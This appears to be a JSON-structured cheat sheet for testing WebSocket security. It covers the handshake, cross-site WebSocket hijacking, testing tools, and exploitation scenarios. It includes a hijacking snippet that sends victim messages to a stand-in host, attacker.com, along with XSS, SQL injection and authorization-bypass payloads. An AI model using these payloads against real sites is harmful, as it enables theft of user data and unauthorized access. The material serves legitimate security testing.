    "sections": [
        {
            "heading": "Protocol Basics",
            "subheadings": [
                {
                    "heading": "Handshake Request",
                    "type": "code_block",
                    "content": [
                        "GET /chat HTTP/1.1",
                        "Host: normal-website.com",
                        "Sec-WebSocket-Version: 13",
                        "Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==",
                        "Connection: keep-alive, Upgrade",
                        "Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2",
                        "Upgrade: websocket",
                        "Origin: https://normal-website.com"
                    ]
                },
                {
                    "heading": "Handshake Response",
                    "type": "code_block",
                    "content": [
                        "HTTP/1.1 101 Switching Protocols",
                        "Connection: Upgrade",
                        "Upgrade: websocket",
                        "Sec-WebSocket-Accept: 0FFP+2nmNIf/h+4BP36k9uzrYGk="
                    ]
                }
            ]
        },
        {
            "heading": "Security Testing",
            "subheadings": [
                {
                    "heading": "Cross-Site WebSocket Hijacking (CSWSH)",
                    "type": "paragraph",
                    "content": "If the server doesn't validate the Origin header, attackers can hijack WebSocket connections.\n``html\n\nvar ws = new WebSocket('wss://vulnerable-site.com/chat');\nws.onopen = function() {\nws.send('{\"action\": \"get_messages\"}');\n};\nws.onmessage = function(event) {\n// Exfiltrate data to attacker server\nfetch('https://attacker.com/log?data=' + encodeURIComponent(event.data));\n};\n\n`\nTest for CSWSH:\n`bash\n# Check if Origin is validated\ncurl -i -N -H \"Connection: Upgrade\" \\\n-H \"Upgrade: websocket\" \\\n-H \"Host: target.com\" \\\n-H \"Origin: https://attacker.com\" \\\n-H \"Sec-WebSocket-Key: SGVsbG8sIHdvcmxkIQ==\" \\\n-H \"Sec-WebSocket-Version: 13\" \\\nhttps://target.com/socket\n# If 101 Switching Protocols → Vulnerable\n``"
                },
                {
                    "heading": "Message Manipulation",
                    "type": "code_block",
                    "content": [
                        "// Intercept and modify WebSocket messages in browser console",
                        "const originalSend = WebSocket.prototype.send;",
                        "WebSocket.prototype.send = function(data) {",
                        "    console.log('Sending:', data);",
                        "    // Modify data here",
                        "    return originalSend.call(this, data);",
                        "};"
                    ]
                },
                {
                    "heading": "Common Vulnerabilities",
                    "type": "table",
                    "headers": [
                        "Vulnerability",
                        "Test"
                    ],
                    "rows": [
                        {
                            "Vulnerability": "Missing Origin validation",
                            "Test": "Send request with different Origin"
                        },
                        {
                            "Vulnerability": "No authentication",
                            "Test": "Connect without session cookie"
                        },
                        {
                            "Vulnerability": "Injection in messages",
                            "Test": "Send , SQL, etc. in messages"
                        },
                        {
                            "Vulnerability": "IDOR via WebSocket",
                            "Test": "Change user IDs in messages"
                        },
                        {
                            "Vulnerability": "Rate limiting bypass",
                            "Test": "WebSocket often lacks rate limits"
                        },
                        {
                            "Vulnerability": "Insecure ws://",
                            "Test": "Check if wss:// is enforced"
                        }
                    ]
                }
            ]
        },
        {
            "heading": "Testing Tools",
            "subheadings": [
                {
                    "heading": "STEWS - Security Testing for WebSockets",
                    "type": "code_block",
                    "content": [
                        "# https://github.com/PalindromeLabs/STEWS",
                        "python3 stews.py -u wss://target.com/socket",
                        "",
                        "# Discovery mode",
                        "python3 stews.py -u https://target.com --discovery",
                        "",
                        "# Fuzzing",
                        "python3 stews.py -u wss://target.com/socket --fuzz"
                    ]
                },
                {
                    "heading": "Burp Suite",
                    "type": "code_block",
                    "content": [
                        "1. Proxy → WebSockets history (shows all WS traffic)",
                        "2. Right-click message → Send to Repeater",
                        "3. Modify and resend messages",
                        "4. Use Intruder for message fuzzing"
                    ]
                },
                {
                    "heading": "wscat (CLI WebSocket Client)",
                    "type": "code_block",
                    "content": [
                        "# Install",
                        "npm install -g wscat",
                        "",
                        "# Connect",
                        "wscat -c wss://target.com/socket",
                        "",
                        "# With headers",
                        "wscat -c wss://target.com/socket -H \"Cookie: session=abc123\"",
                        "",
                        "# Send message",
                        "> {\"action\": \"get_user\", \"id\": 1}"
                    ]
                },
                {
                    "heading": "websocat",
                    "type": "code_block",
                    "content": [
                        "# https://github.com/AhmedMohamedDev/websocat",
                        "websocat wss://target.com/socket",
                        "",
                        "# With Origin header",
                        "websocat -H \"Origin: https://attacker.com\" wss://target.com/socket"
                    ]
                }
            ]
        },
        {
            "heading": "Exploitation Scenarios",
            "subheadings": [
                {
                    "heading": "XSS via WebSocket",
                    "type": "code_block",
                    "content": [
                        "// If messages are rendered without sanitization",
                        "ws.send('{\"message\": \"<img src=x onerror=alert(1)>\"}');"
                    ]
                },
                {
                    "heading": "SQL Injection via WebSocket",
                    "type": "code_block",
                    "content": [
                        "ws.send('{\"user_id\": \"1 OR 1=1--\"}');",
                        "ws.send('{\"search\": \"test\\' UNION SELECT password FROM users--\"}');"
                    ]
                },
                {
                    "heading": "Authorization Bypass",
                    "type": "code_block",
                    "content": [
                        "// Try accessing other users' data",
                        "ws.send('{\"action\": \"get_messages\", \"user_id\": \"admin\"}');",
                        "ws.send('{\"action\": \"delete\", \"message_id\": \"1\", \"user_id\": \"victim\"}');"
                    ]
                }
            ]
        },
        {
            "heading": "Browser Console Testing",
            "type": "code_block",
            "content": [
                "// Create connection",
                "var ws = new WebSocket('wss://target.com/socket');",
                "",
                "// Monitor events",
                "ws.onopen = () => console.log('Connected');",
                "ws.onmessage = (e) => console.log('Received:', e.data);",
                "ws.onerror = (e) => console.log('Error:', e);",
                "ws.onclose = () => console.log('Closed');",
                "",
                "// Send test messages",
                "ws.send(JSON.stringify({action: 'test'}));"
            ]
        },
        {
            "heading": "Related Topics",
            "type": "list",
            "content": [
                "CSRF - CSWSH is similar to CSRF",
                "XSS - Can chain with WebSocket attacks",
                "IDOR - Common in WebSocket APIs"
            ]
        }
